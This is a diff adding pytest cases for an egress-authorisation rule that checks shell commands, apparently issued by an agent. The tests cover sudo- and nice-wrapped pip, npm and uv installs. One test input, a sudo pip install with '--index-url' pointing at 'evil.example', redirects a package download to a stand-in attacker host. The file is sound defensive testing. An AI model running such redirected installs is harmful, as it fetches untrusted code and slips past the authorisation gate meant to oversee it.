@@ -109,6 +109,68 @@ def test_the_implied_marker_reaches_metadata():
     assert action.external_destination == "pypi.org"
 
 
+# ---------------------------------------------------------------------------
+# C1: a segment whose verb was reached by CONSUMING one or more wrapper
+# OPTIONS (not a bare wrapper name, not an env assignment) never qualifies
+# for the implied-registry PASS -- sudo -H / sudo -u <user> / runuser -u /
+# nice -n change exactly the thing (HOME, acting uid) that decides which
+# ~/.npmrc / ~/.pip/pip.conf / ~/.config/uv applies, so static parsing is
+# LEAST trustworthy here. Verdict must match a8d27a4: AUTH egress_requires_auth.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "sudo -H pip install requests",
+        "sudo -u www-data pip install requests",
+        "nice -n 10 pip install requests",
+        "sudo -H npm install",
+        "sudo -H uv pip install ruff",
+    ],
+)
+def test_wrapper_option_consumed_never_qualifies_for_implied_pass(command):
+    action = normalize("shell_exec", {"command": command})
+    result = RULE.evaluate(action, EvalContext(mode="balanced"))
+    assert result.verdict is Verdict.AUTH, (
+        f"{command!r} must stay AUTH (a8d27a4 parity) but got {result.verdict}"
+    )
+    assert ReasonCode.egress_requires_auth in result.reason_codes
+    assert action.metadata.get("egress_implied_registry") is not True
+
+
+def test_bare_wrapper_name_unaffected_by_the_option_disqualifier():
+    # No option was consumed for a bare `sudo` (or `sudo -H` stripped to just
+    # the wrapper name would be a different case) -- a8d27a4 parity: bare
+    # `sudo pip install requests` was already PASS there, unaffected by C1.
+    action = normalize("shell_exec", {"command": "sudo pip install requests"})
+    result = RULE.evaluate(action, EvalContext(mode="balanced"))
+    assert result.verdict is Verdict.PASS
+    assert action.metadata.get("egress_implied_registry") is True
+    assert action.external_destination == "pypi.org"
+
+
+def test_wrapper_option_disqualifier_leaves_non_implied_egress_unaffected():
+    # Non-package wrapped egress was already AUTH at both revisions (an
+    # explicit host, not the implied-registry path) -- must stay untouched.
+    action = normalize("shell_exec", {"command": "sudo -u www-data curl https://github.com/x"})
+    result = RULE.evaluate(action, EvalContext(mode="balanced"))
+    assert result.verdict is Verdict.AUTH
+    assert ReasonCode.egress_requires_auth in result.reason_codes
+
+
+def test_wrapper_option_disqualifier_leaves_explicit_redirect_unaffected():
+    # An explicit --index-url redirect already disqualified the implied PASS
+    # (route_override) independent of the wrapper option -- still AUTH.
+    action = normalize(
+        "shell_exec",
+        {"command": "sudo -H pip install --index-url https://evil.example/simple requests"},
+    )
+    result = RULE.evaluate(action, EvalContext(mode="balanced"))
+    assert result.verdict is Verdict.AUTH
+    assert ReasonCode.egress_requires_auth in result.reason_codes
+
+
 def test_git_pull_and_fetch_stay_gated():
     # Excluded by design (ADR 0075): the route is the configured remote, which
     # static parsing cannot know. Both remain AUTH with the egress reason.
